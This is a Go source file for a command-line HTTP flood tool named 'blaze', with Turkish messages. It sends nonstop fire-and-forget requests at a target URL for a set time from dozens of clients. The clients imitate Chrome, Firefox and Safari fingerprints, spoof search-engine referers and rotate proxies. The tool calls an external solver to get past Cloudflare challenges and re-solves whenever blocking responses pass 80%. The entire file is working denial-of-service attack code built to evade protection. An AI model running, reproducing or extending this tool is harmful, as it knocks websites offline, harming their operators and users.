package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

// ANSI colors
const (
	white = "\033[1;37m"
	gray  = "\033[38;5;245m"
	red   = "\033[1;31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		if arg == "--solve" {
			solve = true
		} else {
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	var solvedCookies string
	var solvedUA string
	if solve {
		var err error
		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
}

type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
	fmt.Printf("cloudflare challenge cozuluyor...\n")

	solverPath := findSolver()
	if solverPath == "" {
		return "", "", fmt.Errorf("solver/index.js bulunamadi")
	}
	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
	cmd.Stderr = os.Stderr
	output, errCmd := cmd.Output()
	if errCmd != nil {
		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
	}

	var result solverResult
	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
	}

	if result.Status == "error" {
		return "", "", fmt.Errorf("%s", result.Error)
	}
	if result.Cookies == "" {
		return "", "", fmt.Errorf("cookie yok (status: %s)", result.Status)
	}

	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
	return result.Cookies, result.UserAgent, nil
}

func findSolver() string {
	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

type clientGroup struct {
	name      string
	tag       string // Ch, FF, SF
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

func (cg *clientGroup) updateCookies(newCookies string) {
	for _, tmpl := range cg.templates {
		tmpl.Header.Set("Cookie", newCookies)
	}
}

// browserLabel maps tag to full display name
var browserLabel = map[string]string{
	"Ch": "Chrome 146",
	"FF": "Firefox 148",
	"SF": "Safari iOS 18",
}

// formatTestResult returns the impersonate line for a browser test.
func formatTestResult(tag string, statusCode int, err error) string {
	label := browserLabel[tag]
	if label == "" {
		label = tag
	}

	if err != nil {
		errMsg := err.Error()
		var reason string
		switch {
		case strings.Contains(errMsg, "tls handshake") || strings.Contains(errMsg, "handshake"):
			reason = "tls handshake failed"
		case strings.Contains(errMsg, "timeout") || strings.Contains(errMsg, "Timeout"):
			reason = "timeout"
		case strings.Contains(errMsg, "connection refused"):
			reason = "connection refused"
		default:
			reason = errMsg
			if len(reason) > 80 {
				reason = reason[:80]
			}
		}
		return fmt.Sprintf("%sImpersonate %s %s>%s %s%s%s", white, label, gray, reset, red, reason, reset)
	}
	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	totalTargetClients := threads
	if totalTargetClients > 40 {
		totalTargetClients = 40
	}
	if totalTargetClients < 10 {
		totalTargetClients = 10
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(256),
		gofire.WithMaxIdleConns(1024),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
	}

	type browserSpec struct {
		name    string
		tag     string // Ch, FF, SF
		profile gofire.BrowserProfile
		clients int
	}

	var browsers []browserSpec

	if solvedCookies != "" {
		browsers = []browserSpec{
			{"chrome", "Ch", gofire.Chrome146, totalTargetClients},
		}
		if solvedUA != "" {
			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
		}
	} else {
		safariClients := totalTargetClients * 4 / 10
		chromeClients := totalTargetClients * 3 / 10
		firefoxClients := totalTargetClients - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers = []browserSpec{
			{"firefox", "FF", gofire.Firefox148, firefoxClients},
			{"chrome", "Ch", gofire.Chrome146, chromeClients},
			{"safari", "SF", gofire.SafariIOS18, safariClients},
		}
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name, tag: bs.tag}
		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		for i := 0; i < bs.clients; i++ {
			c, err := gofire.Emulate(bs.profile, opts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
				os.Exit(1)
			}
			if proxyRotator != nil {
				c.SetProxyRotator(proxyRotator)
			}
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			if solvedCookies != "" {
				tmpl.Header.Set("Cookie", solvedCookies)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
			cg.templates = append(cg.templates, tmpl)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	// Test one client per browser - clean output
	for _, cg := range groups {
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(cg.tag, 0, testErr))
		} else {
			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// Pre-warm silently
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, 4)
		}
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
		recent403   atomic.Int64
		recentTotal atomic.Int64
		refreshing  atomic.Bool
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else if resp != nil {
			recentTotal.Add(1)
			if resp.StatusCode() == 403 {
				recent403.Add(1)
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < 4; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Auto-refresh (silent unless refreshing)
	if solveEnabled {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total := recentTotal.Load()
					count403 := recent403.Load()
					recentTotal.Store(0)
					recent403.Store(0)

					if total < 50 {
						continue
					}
					rate := float64(count403) / float64(total)
					if rate < 0.80 {
						continue
					}
					if !refreshing.CompareAndSwap(false, true) {
						continue
					}

					newCookies, _, errSolve := solveCFChallenge(targetURL)
					if errSolve != nil {
						refreshing.Store(false)
						continue
					}
					for _, cg := range groups {
						cg.updateCookies(newCookies)
					}
					refreshing.Store(false)
				}
			}
		}()
	}

	// Silent - no stats during run
	feedWg.Wait()

	// Only show errors on stop
	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}
